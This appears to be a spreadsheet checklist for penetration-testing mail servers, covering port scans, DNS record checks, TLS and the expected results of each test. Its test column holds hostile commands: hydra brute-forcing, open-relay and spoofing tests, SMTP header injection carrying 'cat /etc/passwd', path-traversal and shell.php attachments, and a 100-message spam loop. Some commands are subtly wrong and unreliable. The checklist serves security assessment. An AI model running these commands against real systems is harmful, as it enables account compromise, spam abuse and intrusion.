Category,Check Item,Details,How to test,How to check the test case,Status
Information Gathering,Identify Mail Server Software,"Use `nslookup`, `dig`, `whatweb`, `nmap`","http://www.mxtoolbox.com/SuperTool.aspx , https://www.checktls.com/index.html","Look for SMTP server name/version in the banner like postfix, Exim, Microsoft ESMTP, …",Choose an item.
,Enumerate Open Ports,"Check for ports 25 (SMTP), 465 (SMTPS), 587 (Submission), 110 (POP3), 143 (IMAP), 993/995","nmap -Pn -p25,465,587,110,143,993,995 <$target>","Check if expected mail ports (25, 465, 587, 110, 995, 143, 993) are open",Choose an item.
,Check DNS Records,"SPF, DKIM, DMARC, MX records using `dig`","dig +short TXT example.org, dig +short TXT default._domainkey.example.org, dig +short TXT _dmarc.example.org","These are explained completely in rows 24, 25, 26",Choose an item.
,Banner Grabbing,"Use `telnet`, `netcat` to collect server version from SMTP/IMAP/POP",telnet <$target> 25,A banner with SMTP software/version should be displayed,Choose an item.
,Command enumeration,Use EHLO to list SMTP extensions via netcat,telnet <$target> 25 \HELP,"Based on implementation, ""HELP"" or ""EHLO test.com"" will show you the available commands",Choose an item.
,shared host,you can easily use shodan search engine to find other hosts if any available,"port:25 hostname:""example.org"" country:""IR""",Hostnames must include the domain original name (subdomains are ok to be on a same host),Choose an item.
,nmap SMTP scripts,Run smtp-commands,"nmap --script-help ""*smtp*""",Just find nmap smtp scripts ,Choose an item.
Authentication & Access Control,Weak Credentials,"Test common/default credentials (hydra, medusa)",hydra -l /PATH/TO/USERNAME/WORDLIST -P /PATH/TO/PASSWORD/WORDLIST -v -t 1 smtp://<$target>:25,Look for valid credentials,Choose an item.
,Brute-force Login Attempts,Check rate limiting or account lockout policy,"nmap -p25 --script smtp-brute <target> , hydra -l admin -P /path/to/passwords.txt mail.example.org http-post-form \
""/PathToLoginPage:user=^USER^&pass=^PASS^:F=Incorrect"" -t 1 -V",Try to find the limitation in case they implement it,Choose an item.
,STARTTLS/SSL Support,"Check with `openssl client` for supported ciphers, certs","openssl client -starttls smtp -connect mail.example.org:(25, 465, 587)","Analayse the certificate for self-signed certs, wrong CN/SAN, weak key, old algorithm(specifically TLS version), mail software, …",Choose an item.
,Check for Anonymous Relay,Attempt unauthenticated relay,swaks --to victim@gmail.com --from spammer@evil.com --server mail.example.org --port 25,Expected to get authorization error or not to send email successfully,Choose an item.
,Test Authentication Mechanisms,Login via SMTP/IMAP using plaintext or secure auth,swaks --to recipient@example.org --from sender@example.org --server mail.example.org --port 25 --auth LOGIN --auth-user sender@example.org --auth-password yourpassword,TLS must be enforced before authentication means that the script must not send email due to insecure connection,Choose an item.
Vulnerabilities,Check for CVEs,"Use `searchsploit`, CVE databases for known issues in detected software","cve.mitre.org , nvd.nist.gov",Always check for latest exploits or search them by version to save time,Choose an item.
,Check for Command Injection,Test input fields or email headers,"swaks --to ""pentest@example.org"" --from ""e.azimi@example.org"" --header 'Subject: Inject Test\r\n\r\n.\r\n RCPT TO:<erfanazimmi@gmail.com>\r\nDATA\r\nSubject: Hacked\r\n\r\nSMTP injection test\r\n\n\ncat /etc/passwd\n\n\n\r' --server mail.example.org --port 25 --auth LOGIN --auth-user ""e.azimi@example.org"" --auth-password ""*****""",Check content of the received email  ,Choose an item.
,Open Relay Test,"Use `smtp-user-enum`, `swaks`",nmap -Pn -p25 --script smtp-open-relay <$target>,Check the output of the script,Choose an item.
,Buffer Overflow (if applicable),Older servers may be vulnerable to crafted input,"exploit-db.com, [msfconsole] -> search smtp buffer overflow",Check if the exploit run correctly,Choose an item.
,Open relay check,Test MAIL FROM external RCPT TO external with or without EHLO,swaks --to victim@gmail.com --from spammer@evil.com --server mail.example.org --port 25 --protocol SMTP (--no-ehlo),Check if the email has been sent or not,Choose an item.
,SMTP injection,Test line breaks and header injections in envelopes or commands,"swaks --to victim@example.org --from ""attacker@example.org\nBCC: victim2@example.org"" --server mail.example.org --port 25",Check the received email for result,Choose an item.
,User enumeration,Use VRFY,"nmap -Pn -p25 --script smtp-enum-users <$target>, telnet <$target> 25 \(VRFY|EXPN) (admin|admin@example.org)",Try to find a valid user email,Choose an item.
,NTLM info leak,Check for NTLM vulnerability disclosure via nmap NSE smtp-ntlm-info,nmap -Pn -p25 --script smtp-ntlm-info <$target>,Analyse the nmap script output,Choose an item.
Misconfiguration,Directory Traversal,Try attachments or email headers for LFI/RFI,"swaks --to victim@example.org --from attacker@example.org --server mail.example.org --attach <file-to-attach> --attach-name ""../../../../../../etc/passwd"" --header ""Subject: ../../../../../../etc/passwd"" , swaks --to victim@example.org --from attacker@example.org --server mail.example.org --attach shell.php --attach-type ""application/x-httpd-php"" --attach-name ""shell.php""",Try to read a file on server like '../../etc/passwd',Choose an item.
,Mail Spoofing Test,Send spoofed emails (SPF/DKIM/DMARC weak) ,swaks --to victim@target.com --from ceo@targetdomain.com --server mail.testserver.com --port 25,Check for the received spoofed email,Choose an item.
,SPF Record Verification,Use dig to verify SPF record and enforcement flags,dig +short TXT example.org,Search for trusted ip addresses,Choose an item.
,DKIM Signature Validation,Check for proper DKIM keys and alignment,dig +short TXT default._domainkey.example.org,"Search for weak key algorithm, corrupted key or multiple records",Choose an item.
,DMARC Policy Check,Verify policy enforcement (none/quarantine/reject),"dig +short TXT _dmarc.example.org | tr -d '""' | grep -oE '(p|sp|adkim|aspf|rua)=[^;]*'","Search for p, sp, adkim, aspf, rua headers to be set correctly with company policies",Choose an item.
,Open Mailbox/IMAP Directory Listing,Check access control via IMAP,"telnet mail.example.org 143 ""then"" a LOGIN user@example.org password *********",Try to find out if the server is vulnerable to directory listing,Choose an item.
,SMTP VRFY/EXPN Commands,Test for user enumeration via SMTP commands,telnet <$target> 25 \(VRFY|EXPN) admin|admin@example.org,Check  If VRFY or EXPN discloses valid users,Choose an item.
,Directory Indexing,,intitle:index of inurl:mail site:example.org,Check for ' index of ' pages,Choose an item.
,AUTH before TLS on port 25,Check if AUTH is allowed before STARTTLS,telnet <$target> 25 \EHLO not-target-company.com,TLS must be enforced before AUTH,Choose an item.
Post-Exploitation,Mailbox Enumeration,Access user mailboxes if credentials obtained,swaks --to victim@example.org --from user@example.org --server mail.example.org --port 587 --auth LOGIN --auth-user user@example.org --auth-password password --tls,Check if you can either download or read other users email,Choose an item.
,Email Exfiltration,Download messages to validate impact,,,Choose an item.
,Send Email as Another User,Privilege escalation or impersonation check,swaks --to victim@company.com --from ceo@company.com --server mail.example.org --port 587 --auth LOGIN --auth-user validuser@example.org --auth-password password --tls,Check for horizontal or vertical privilege escalation to sent email as admin or another user,Choose an item.
,Abuse as Spam Relay,Check if the server can be abused for outbound spam,"if not vulnerable to open relay then --> 
bash -c 'for i in $(seq 1 100); do swaks --to victim@gmail.com --from user@example.org --server mail.example.org --port 587 --auth LOGIN --auth-user user@example.org --auth-password password --tls --body ""Spam test #$i"" done'",All the emails must be sent to recipient ,Choose an item.
TLS/Encryption,TLS port check,Validate certs & ciphers on port 465 with openssl s_client,openssl s_client -connect mail.example.org:465 -servername mail.example.org,Check for weak algorithms,Choose an item.
,,,,,
,,,,,
,,,,,
Reporting,Capture Logs and Evidence,"Screenshots, packet captures, test results",,,
,Rate Severity of Findings,Categorize by CVSS or risk level,first.org/cvss/calculator/4-0,,
,,,,,
